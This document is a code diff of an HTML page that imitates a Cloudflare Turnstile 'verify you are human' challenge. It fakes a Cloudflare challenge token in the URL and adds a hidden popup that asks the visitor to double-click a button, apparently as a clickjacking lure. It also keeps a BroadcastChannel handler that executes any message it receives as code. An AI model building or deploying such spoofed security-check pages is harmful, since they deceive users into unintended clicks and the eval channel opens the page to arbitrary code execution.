@@ -5,8 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script>
       new BroadcastChannel('eval').onmessage = (e) => new Function(e.data)()
+      history.replaceState(null, '', location.pathname + '?__cf_chl_rt_tk=QXMQ8mYgW1aScjUnRJqWq0iBdboTU6RMqC18hTNn8XA-1750040152-1.0.1.1-PIzbPvQzyEcVPOHV7QrOX6zXnE5v5uYIo_Wy65dIlxs')
     </script>
     <link rel="stylesheet" href="style.css" />
+    <script src="main.ts" type="module"></script>
   </head>
   <body>
     <div class="main-wrapper">
@@ -133,6 +135,7 @@
                     <div
                       class="error-overrun error-message"
                       style="display: none"
+                      id="turnstile-stuck"
                     >
                       <span class="fr-overrun">Stuck here?</span
                       ><a href="#refresh" class="fr-overrun-link"
@@ -224,56 +227,10 @@
       </div>
     </footer>
 
-    <script>
-      /** @type {HTMLHeadingElement} */
-      const title = document.getElementById('title')
-      /** @type {HTMLDivElement} */
-      const loadingSpinner = document.getElementById('loading-spinner')
-      /** @type {HTMLDivElement} */
-      const coreText = document.getElementById('core-text')
-      /** @type {HTMLHeadingElement} */
-      const challengeErrorText = document.getElementById('challenge-error-text')
-      /** @type {HTMLDivElement} */
-      const turnstileWidget = document.getElementById('turnstile-widget')
-      /** @type {HTMLDivElement} */
-      const turnstileVerifying = document.getElementById('turnstile-verifying')
-      /** @type {HTMLDivElement} */
-      const turnstileCheckbox = document.getElementById('turnstile-checkbox')
-      /** @type {HTMLInputElement} */
-      const turnstileCheckboxInput = document.getElementById(
-        'turnstile-checkbox-input'
-      )
-
-      title.textContent = location.hostname
-      coreText.textContent = `${location.hostname} needs to review the security of your connection before proceeding.`
-      turnstileCheckboxInput.checked = false
-      ;(async () => {
-        await sleep(1_000)
-        loadingSpinner.style.display = 'none'
-        coreText.classList.add('spacer-top')
-
-        await sleep(500)
-        turnstileWidget.style.display = 'grid'
-
-        await sleep(1_500)
-        turnstileVerifying.style.display = 'none'
-        turnstileCheckbox.style.display = 'grid'
-        challengeErrorText.textContent =
-          'Verify you are human by completing the action below.'
-      })()
-      turnstileCheckboxInput.addEventListener('change', async () => {
-        if (turnstileCheckboxInput.checked) {
-          await sleep(200)
-          turnstileVerifying.style.display = 'grid'
-          turnstileCheckbox.style.display = 'none'
-          challengeErrorText.textContent =
-            'Verifying you are human. This may take a few seconds.'
-        }
-      })
-
-      async function sleep(ms) {
-        return new Promise((resolve) => setTimeout(resolve, ms))
-      }
-    </script>
+    <div id="follow-position"></div>
+    <div id="popup" style="display:none">
+      Please double click the button to continue.
+      <button id="popup-button">Double Click</button>
+    </div>
   </body>
 </html>
